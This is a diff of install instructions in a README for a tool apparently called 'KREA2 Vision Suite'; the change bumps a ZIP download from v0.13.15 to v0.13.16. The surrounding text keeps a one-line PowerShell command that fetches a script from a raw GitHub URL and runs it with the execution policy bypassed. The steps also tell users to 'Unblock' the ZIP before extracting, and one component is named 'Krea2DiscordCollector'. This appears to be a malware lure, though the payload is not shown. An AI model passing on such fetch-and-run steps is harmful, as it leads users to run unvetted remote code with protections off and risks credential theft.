@@ -8,7 +8,7 @@
    $p="$env:TEMP\Install-KREA2VisionSuite.ps1"; Invoke-WebRequest "https://raw.githubusercontent.com/pixelgraple/KREA2-Vision-Suite/main/Install-KREA2VisionSuite.ps1" -OutFile $p; powershell -NoProfile -ExecutionPolicy Bypass -File $p
    ```
 
-   Do not download only `Krea2DiscordCollector.plugin.js`. For a manual install, download the [v0.13.15 Windows ZIP](https://raw.githubusercontent.com/pixelgraple/KREA2-Vision-Suite/main/releases/Krea2VisionSuite-v0.13.15-win64.zip), right-click the ZIP, select **Properties**, enable **Unblock**, select **Apply**, and only then extract it.
+   Do not download only `Krea2DiscordCollector.plugin.js`. For a manual install, download the [v0.13.16 Windows ZIP](https://raw.githubusercontent.com/pixelgraple/KREA2-Vision-Suite/main/releases/Krea2VisionSuite-v0.13.16-win64.zip), right-click the ZIP, select **Properties**, enable **Unblock**, select **Apply**, and only then extract it.
 
 ## Updates
 
